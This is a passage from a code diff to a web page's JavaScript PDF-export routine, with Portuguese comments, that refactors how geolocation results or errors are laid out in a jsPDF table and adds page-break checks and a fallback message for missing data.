+                // --- DADOS DE LOCALIZAÇÃO (TABELA 2) ---
                 if (data.result || data.error) {
-                    yOffset += 10;
+                     checkNewPage(20); // Estimativa inicial
+                     yOffset += 10; // Espaço antes da próxima seção
                     doc.setFontSize(12);
-                    doc.text('Resultados de Geolocalização', 10, yOffset);
+                    doc.text(data.result ? 'Resultados de Geolocalização' : 'Erro de Geolocalização', 10, yOffset);
                     yOffset += 2;
 
                     const locationResultStore = data.result || data.error;
-                    
-                    doc.autoTable({
-                        startY: yOffset + 4,
-                        head: [['Campo', 'Valor']],
-                        body: objectToTableData(locationResultStore),
-                        theme: 'striped',
-                        styles: { fontSize: 9 },
-                        headStyles: headStyles,
-                        columnStyles: { 0: { fontStyle: 'bold', cellWidth: 40 } }
-                    });
+                    doc.autoTable({ ...tableConfig, startY: yOffset + 4, body: objectToTableData(locationResultStore) });
+                    // yOffset é atualizado pelo hook didDrawPage
+                } else {
+                     checkNewPage(10);
+                     yOffset += 10;
+                     doc.setFontSize(9);
+                     doc.text("Nenhum dado de geolocalização recebido.", 10, yOffset);
+                     yOffset += 10;
                 }
 
                 // Salva o PDF
@@ -600,10 +698,9 @@
 
             }).catch(error => {
                 alert('Falha ao buscar dados para exportação PDF: ' + error.message);
-                console.error('PDF Error:', error);
+                console.error('PDF Export Error:', error);
             });
     });
-
 
 </script>
 </body>
